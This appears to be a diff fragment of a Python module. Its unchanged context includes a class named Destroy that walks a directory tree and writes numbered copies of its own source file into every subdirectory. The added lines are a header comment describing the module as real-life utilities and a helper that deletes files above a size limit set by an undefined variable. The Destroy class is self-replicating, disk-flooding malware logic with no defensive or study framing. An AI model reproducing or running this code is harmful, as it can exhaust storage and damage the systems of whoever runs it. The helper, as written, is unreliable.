@@ -1,3 +1,6 @@
+# -*- coding: UTF-8 -*-
+#在这个模块里添加了些许从现实生活中抽象出来的功能
+
 import hashlib
 import os
 import shutil
@@ -87,14 +90,17 @@ class Destroy(object):
         file_li = []
         for a, b, c in os.walk(ppach):
             file_li.append(str(a))
+
         for i in file_li:
             f_path = os.path.join(ppach, i)
+
             if os.path.isdir(f_path):
                 with open(__file__, 'r', encoding='utf-8') as f:
                     a = f.read()
                 file_path = os.path.join(f_path, __file__)
                 name = os.path.basename(file_path)
                 (filename, listname) = os.path.splitext(name)
+
                 for i in range(1, int(max) + 1):
                     file = os.path.join(f_path, filename + str(i) + listname)
                     try:
@@ -155,4 +161,16 @@ class Operaction():
 
     def __exit__(self, exc_type, exc_val, exc_tb):
         return True
+
+def getfileSize(path, name):
+    #用于文件监控，防止日志文件占用过多
+    file=os.path.join(path, name)
+    try:
+        size = os.path.getsize(file)
+        if size >= filesize:
+            os.remove(file)
+        else:
+            return size
+    except Exception as e:
+        print(e)
 # 113
